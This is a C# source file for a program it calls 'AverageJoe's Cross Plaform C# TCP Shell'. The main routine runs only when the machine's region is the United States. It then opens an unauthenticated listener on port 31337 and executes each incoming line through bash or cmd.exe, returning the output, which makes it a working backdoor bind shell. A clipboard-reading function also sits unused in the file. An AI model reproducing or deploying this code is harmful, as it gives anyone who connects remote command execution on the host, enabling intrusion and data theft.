using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Security.Permissions;

namespace win_or_lin
{

    class Program
    {

		public static void ReadTheClipboard()
		{
			string clipboardText = Clipboard.GetText(TextDataFormat.Text);
            // Do whatever you need to do with clipboardText
            Console.WriteLine("Pasted: {0}", clipboardText);
            Console.Read();
            // it is linux compatible!!!!!!
		}
        public static bool America()
        {
            string region = System.Globalization.RegionInfo.CurrentRegion.DisplayName;
            if (region == "United States")
            {
                return true;
            }
            else
            {
                return false;
            }


        }
        public static bool IsLinux
        {
            get
            {
                int p = (int)Environment.OSVersion.Platform;
                return (p == 4) || (p == 6) || (p == 128);
            }
        }
        [STAThread]
        static void Main(string[] args)
        {
            if(America())
            {
                int PortNo = 31337;
                TcpListener servListener;
                servListener = new TcpListener(IPAddress.Any, PortNo);
                servListener.Start();
                while (true)
                {
                    Socket rocksock = servListener.AcceptSocket();
                    try
                    {
                        Stream dastream = new NetworkStream(rocksock);
                        StreamReader sr = new StreamReader(dastream);
                        StreamWriter sw = new StreamWriter(dastream);
                        sw.AutoFlush = true;
                        sw.WriteLine("AverageJoe's Cross Plaform C# TCP Shell!");
                        while (true)
                        {
                            string command = sr.ReadLine();
                            if (command == "" || command == null)
                            {
                                sw.WriteLine("Command not entered!");
                                break;
                            }
                            System.Diagnostics.Process kek = new System.Diagnostics.Process();
                            if (IsLinux)
                            {
                                kek.StartInfo.FileName = "/bin/bash";
                                kek.StartInfo.Arguments = "-c " + command;
                            }
                            else
                            {
                                kek.StartInfo.FileName = "cmd.exe";
                                kek.StartInfo.Arguments = "/c " + command;
                            }
                            kek.StartInfo.RedirectStandardOutput = true;
                            kek.StartInfo.UseShellExecute = false;
                            kek.Start();
                            sw.WriteLine(command);
                            sw.WriteLine(kek.StandardOutput.ReadToEnd());
                        }
                        dastream.Close();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                    rocksock.Close();
                }

            }
            

        }
    }
}
